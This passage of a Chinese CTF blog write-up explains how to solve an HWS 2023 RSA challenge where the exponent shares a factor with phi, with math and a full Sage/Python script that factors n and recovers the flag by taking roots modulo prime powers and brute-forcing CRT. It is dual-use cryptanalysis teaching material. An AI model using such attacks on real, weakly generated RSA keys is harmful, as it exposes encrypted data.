xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>m</mi><mi>g</mi></msup><msup><mo stretchy="false">)</mo><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>≡</mo><mi>c</mi><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(m^g)^{e&#x27;} \equiv c \pmod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.24248em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.714392em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">g</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.99248em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8278285714285715em"><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">c</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mi>g</mi></msup><mo>≡</mo><msup><mi>c</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^g \equiv c^{d&#x27;} \pmod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.714392em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.714392em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">g</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.99248em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.99248em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8278285714285715em"><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>g</mi></msup><mo>&lt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m^g&lt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.703492em;vertical-align:-.0391em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.664392em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">g</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">n</span></span></span></span>，我们可以考虑直接开根得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span>，但在这里 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>=</mo><mn>108</mn></mrow><annotation encoding="application/x-tex">g=108</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal" style="margin-right:.03588em">g</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">8</span></span></span></span>，且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">m</span></span></span></span> 经过 padding 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">n</span></span></span></span> 同级</p><p>因此考虑在有限域上开根然后再 CRT 组合爆破得到 flag：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mi>g</mi></msup><mo>≡</mo><msup><mi>c</mi><msubsup><mi>d</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></msup><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><msub><mi>p</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^g \equiv c^{d&#x27;_1} \pmod{p_1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.714392em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.714392em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">g</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.9924799999999999em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.9924799999999999em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8278285714285715em"><span style="top:-2.214em;margin-left:0;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.286em"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mi>g</mi></msup><mo>≡</mo><msup><mi>c</mi><msubsup><mi>d</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></msup><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><msub><mi>p</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^g \equiv c^{d&#x27;_2} \pmod{p_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.714392em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.714392em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">g</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.9924799999999999em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.9924799999999999em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8278285714285715em"><span style="top:-2.214em;margin-left:0;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.286em"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow><annotation encoding="application/x-tex">\vdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.53em;vertical-align:-.03em"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0;border-top-width:1.5em;bottom:0"></span></span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mi>g</mi></msup><mo>≡</mo><msup><mi>c</mi><msubsup><mi>d</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></msup><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^g \equiv c^{d&#x27;_i} \pmod{p_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.714392em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.714392em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">g</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.9924799999999999em;vertical-align:0"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.9924799999999999em"><span style="top:-3.1130000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8278285714285715em"><span style="top:-2.214em;margin-left:0;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-2.931em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.286em"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.31166399999999994em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>完整脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">n = <span class="number">255550794734774347335455038653204099810524562323968101081052744238324333979282590769066826059535810339765419405089707653972316828518446466787073982991340735273047955757161722774546888128720663627716647123110956021905275918358574092054477588935546729192812379266210918802470144452212508255209922150559524376661512464064852413804511191503030046546647554981646983220695416838829085308878177824361071544916728725428437436959573167863053126718594118224053088660739173865895266537548733106779437480905737491231720771570860988017959907437998012442781279100256862684919251885437194156545435396952798548033193683684362049646718627530076461463826459504520525895649547513376441325848313193080013281816762156916219271109726593135112626577858906494025788770088106285316571255392298608980679161123528759865796345121056864973189231253364595956642612401745212207858555858704724770456899071144650909246822311039572915447866615638976747716646382091135281119109866295649034560378368202797914202112090339159898226929176034503535419893300159083361891627300767030933209665917744361038219820997348160094737332979677839131999258559999565207302339242257832022939036526481610130970477187338439181123984340269665409009894192138483254592729253191096427332283419085864095600303323775372526431524911842065699875575955728772820558157791292247976982470646890930951250598649964200733076634093613078091713383782021194766013790646324780327618195433827227105459480409797466859653960886570869469172506894631937612508518886406112758352094014377947728184352908630672750330561369500089138179794848896959683336195170519521</span></span><br><span class="line">e = <span class="number">57564</span></span><br><span class="line">c = <span class="number">29259244746260903447574448389058952310000390135231599667104954615635954705912759181552349897154663199516384757779582324312559110410628822220097857204989378367616522573650610718867075518776621505865327181301059226036067398269476892575801933638458560523584293063843890012581096233699743704556897984235725492806550009731913445801481786988321848320254380607620726887530437151238556482879159888862341096974129499878601309077513908335631417136332585391767849651968095851808312565329858938394084369711172343300695636449663297542069122814607488273607842533010193498547579501368165500427762712900139188279259336486273788664239339542187191374015805659616093967428577968683677885747775540903578723024681500272919689849253480672194507905399890280339044782040395397922973935735424691828624724029439840506402735626398047317544972966643810550593849196291833043243448655939654884418027006572740130515844853007135331296523599052132266288322473865775521953742444721612389547052020839760259179074124960827686670217980159612966767064088131176654212504654177367329044762238432531402899949096987765334061101859346928585114984440559379578507872401025874782849854603895110182401204202962118890563473961321104811452539667609870771280348801335004559132482743318366689808669972965573335905879806817618597010442262336079838039317609336210571773187461470707420797827741277982208089496339300646565067740673242728353659143107970717482392927903021102141779217003523105389389513154792904745687959335115429159530013641777064904216646895961910784920181748841104318013067029395394948190384737300533803009402182800702</span></span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">fi = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>, <span class="number">257</span>):</span><br><span class="line">    base = <span class="number">1</span> &lt;&lt; i</span><br><span class="line">    t = next_prime(base + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> (t &lt;= base + <span class="number">500000</span>):</span><br><span class="line">        <span class="keyword">if</span> n % t == <span class="number">0</span>:</span><br><span class="line">            p.append(t)</span><br><span class="line">            fi = <span class="literal">True</span></span><br><span class="line">        t = next_prime(t)</span><br><span class="line">    <span class="keyword">if</span> fi:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Find primes&quot;</span>)</span><br><span class="line"></span><br><span class="line">k = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> p:</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    t = n</span><br><span class="line">    <span class="keyword">while</span> t % x == <span class="number">0</span>:</span><br><span class="line">        t //= x</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    k.append(num)</span><br><span class="line"></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    phi *= <span class="built_in">pow</span>(p[i], k[i] - <span class="number">1</span>) * (p[i] - <span class="number">1</span>)</span><br><span class="line">pk_phi = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    pk_phi.append(p[i] ** (k[i] - <span class="number">1</span>) * (p[i] - <span class="number">1</span>))</span><br><span class="line">    p[i] = p[i] ** k[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Get phi&quot;</span>)</span><br><span class="line"></span><br><span class="line">g = gcd(e, phi)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] The gcd of e and phi is:&quot;</span>, g)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">    d = inverse(<span class="built_in">int</span>(e // g), pk_phi[i])</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, p[i])</span><br><span class="line">    res.append(Zmod(p[i])(m).nth_root(g, <span class="built_in">all</span>=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> vc <span class="keyword">in</span> itertools.product(*res):</span><br><span class="line">    _c = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> vc]</span><br><span class="line">    m = long_to_bytes(<span class="built_in">int</span>(crt(_c, p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Find flag:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/01/CkJSFKwhNBvfPmR.png" alt=""></p></div><section class="meta" id="footer-meta"><time class="metatag time" itemprop="dateUpdated" datetime="2024-11-01T14:35:03+08:00" content="2024-11-01 星期五"><i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i> &nbsp;2024-11-01 星期五</time><div class="metatag tags"><a class="tag" href="/tags/HWS/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>&nbsp;HWS</a></div><div class="metatag share -share-list"><i class="left fas fa-share-alt fa-fw" aria-hidden="true"></i><div class="-share-list share-body"><a class="-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer noopener" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://sxyugao.top/p/20fb689d.html&title=HWS第七期2023夏令营选拔赛 Writeup | YuGao's Blog&summary=暑假参加了 HWS 夏令营选拔赛，最近整理文件的时候想着记录一下。
其实是博客没更新太久想着更新一下"><img src="/images/qq.png"> </a><a class="-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer noopener" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://sxyugao.top/p/20fb689d.html&title=HWS第七期2023夏令营选拔赛 Writeup | YuGao's Blog&summary=暑假参加了 HWS 夏令营选拔赛，最近整理文件的时候想着记录一下。
其实是博客没更新太久想着更新一下"><img src="/images/qzone.png"> </a><a class="-share-sina" title="微博" rel="external nofollow noopener noreferrer"><img src="/images/sina.png"></a></div></div></section><div class="prev-next"><section class="next"><span class="art-item-right" aria-hidden="true"><h6>下一页&nbsp; <i class="fas fa-chevron-right" aria-hidden="true"></i></h6><h4><a href="/p/50315424.html" rel="prev" title="领航杯江苏省赛 2022 Linkgame">领航杯江苏省赛 2022 Linkgame</a></h4></span></section></div></section></article><br><article class="card-shadow blur post comments"><section class="article typo"><section id="comments"><div id="valine_container" class="valine_thread"><i class="fas fa-spinner fa-spin fa-fw"></i></div></section></section></article><script>window.subData={title:"HWS第七期2023夏令营选拔赛 Writeup",tools:!0}</script><script>new Valine({el:"#valine_container",verify:!0,notify:!1,appId:"WA9s4PHugzzfhkfjvuyMuxon-gzGzoHsz",appKey:"6ueAjf6IMWsyoRLCwduNmLzT",pageSize:5,placeholder:"ヾﾉ≧∀≦)o 来啊！快活啊！",visitor:!0,recordIP:!1,serverURLs:"https://wa9s4phu.lc-cn-n1-shared.com",path:window.location.pathname})</script></div><aside class="l_side"><section class="card-shadow blur widget author"><div class="content"><div class="avatar"><img class="avatar" src="https://cdn.jsdelivr.net/gh/sxyugao/Website/images/avatar.png"></div><div class="social-wrapper"><a href="/rss.xml" class="social" target="_blank" rel="external"><i class="social fas fa-rss" aria-hidden="true"></i> </a><a href="mailto:sxyugao@qq.com" class="social" target="_blank" rel="external"><i class="social fas fa-envelope" aria-hidden="true"></i> </a><a href="https://wpa.qq.com/msgrd?v=3&uin=2645943187&site=qq&menu=yes" class="social" target="_blank" rel="external"><i class="social fab fa-qq" aria-hidden="true"></i> </a><a href="https://github.com/sxyugao" class="social" target="_blank" rel="external"><i class="social fab fa-github" aria-hidden="true"></i> </a><a href="https://music.163.com/#/user/home?id=536677549" class="social" target="_blank" rel="external"><i class="social fas fa-headphones-alt" aria-hidden="true"></i></a></div></div></section><section class="card-shadow blur widget hitokoto"><header><div><i class="fa fa-quote-left fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 一言（ヒトコト）</div></header><div class="content"><p style="text-align:center" id="hitokoto-content"></p><p style="text-align:right;margin-top:15px" id="hitokoto-from"></p></div></section><section class="card-shadow blur widget category"><header><div><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 所有分类</div></header><div class="content"><ul class="entry"><li><a class="flat-box" title="/categories/CTF/" href="/categories/CTF/"><div class="name">CTF</div><div class="badge">(14)</div></a></li><li><a class="flat-box child" title="/categories/CTF/HGAME/" href="/categories/CTF/HGAME/"><div class="name">HGAME</div><div class="badge">(2)</div></a></li><li><a class="flat-box child" title="/categories/CTF/HWS/" href="/categories/CTF/HWS/"><div class="name">HWS</div><div class="badge">(2)</div></a></li><li><a class="flat-box child" title="/categories/CTF/Hackergame/" href="/categories/CTF/Hackergame/"><div class="name">Hackergame</div><div class="badge">(1)</div></a></li><li><a class="flat-box child" title="/categories/CTF/N1BOOK/" href="/categories/CTF/N1BOOK/"><div class="name">N1BOOK</div><div class="badge">(1)</div></a></li><li><a class="flat-box child" title="/categories/CTF/Web/" href="/categories/CTF/Web/"><div class="name">Web</div><div class="badge">(7)</div></a></li><li><a class="flat-box child" title="/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/" href="/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/"><div class="name">蓝帽杯</div><div class="badge">(1)</div></a></li><li><a class="flat-box" title="/categories/OI/" href="/categories/OI/"><div class="name">OI</div><div class="badge">(12)</div></a></li><li><a class="flat-box child" title="/categories/OI/CodeForces/" 